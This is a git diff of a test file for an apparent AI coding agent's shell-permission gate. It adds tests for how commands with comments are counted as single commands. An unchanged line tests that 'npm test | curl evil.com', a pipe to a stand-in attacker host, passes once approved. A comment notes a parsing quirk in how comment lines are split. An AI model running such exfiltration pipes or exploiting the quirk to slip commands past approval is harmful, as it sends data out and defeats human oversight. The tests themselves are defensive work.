@@ -14,7 +14,7 @@ import {
 } from "./command.js";
 import { matchesPattern, escapeGlobLiteral } from "./matcher.js";
 import { evaluateApprovals } from "./authz-grants.js";
-import { classifyTool, buildRequests, isAutoAllowedShellCall } from "./classify.js";
+import { classifyTool, buildRequests, isAutoAllowedShellCall, isSingleShellCommand } from "./classify.js";
 import { createPermissionGate } from "./gate.js";
 import { createMcpToolPermissionRegistry, registerMcpClientTools } from "../mcp/tool-permissions.js";
 import { listWorktreeRoots, createWorktreeRootsProvider } from "./worktree-roots.js";
@@ -2000,6 +2000,50 @@ describe("preApprove", () => {
     // second segment would pass without asking.
     expect((await gate.evaluate(shellCall("npm test | curl evil.com"))).allowed).toBe(true);
     expect(asked).toBe(1);
+  });
+
+  test("agrees with the interactive scope ladder on whether a comment-trailing command is single", async () => {
+    // "echo hi && # why" has one real segment once the trailing comment is
+    // filtered out. The interactive scope ladder (buildRequests/shellApprovalScopes)
+    // already filters comment-only segments before counting, so it offers the
+    // full per-command ladder (prefix + exact) as if this were one command.
+    // preApprove's gate must reach the same verdict, since both answer the
+    // same underlying "is this a single shell command" question.
+    const command = "echo hi && # why";
+
+    const gate = createPermissionGate({
+      approvals: [],
+      requestApproval: async () => ({ allow: true }),
+      interactive: true,
+      skipPermissions: false,
+    });
+    gate.preApprove("run_shell", command);
+    const preApproveTreatsAsSingle = gate.getSessionApprovals().length === 1;
+
+    const requests = buildRequests(shellCall(command));
+    const scopeLadderTreatsAsSingle = requests[0]!.scopes.length > 1;
+
+    expect(preApproveTreatsAsSingle).toBe(scopeLadderTreatsAsSingle);
+  });
+
+  test("isSingleShellCommand narrows a pure-comment command to false", () => {
+    // Before the shared realShellSegments predicate, gate.ts's own
+    // isSingleShellCommand did not filter comment-only segments, so a
+    // pure-comment "command" like "# just a comment" counted as one real
+    // segment and was treated as single. The shared predicate filters it
+    // out, leaving zero segments, so this must now be false.
+    expect(isSingleShellCommand("# just a comment")).toBe(false);
+  });
+
+  test("isSingleShellCommand treats a leading-comment-then-chain as its trailing real segment", () => {
+    // splitChainedCommand splits on "&&" before recognizing that "#" extends
+    // a comment to end of line, so "# a && b" splits into ["# a", "b"] even
+    // though a real shell treats the whole line as one comment (nothing
+    // after "#" ever runs). Filtering the comment-only "# a" segment leaves
+    // exactly one real segment, "b", so this is scored as a single command —
+    // matching shellApprovalScopes' existing behavior, not a regression
+    // introduced here.
+    expect(isSingleShellCommand("# a && b")).toBe(true);
   });
 });
 
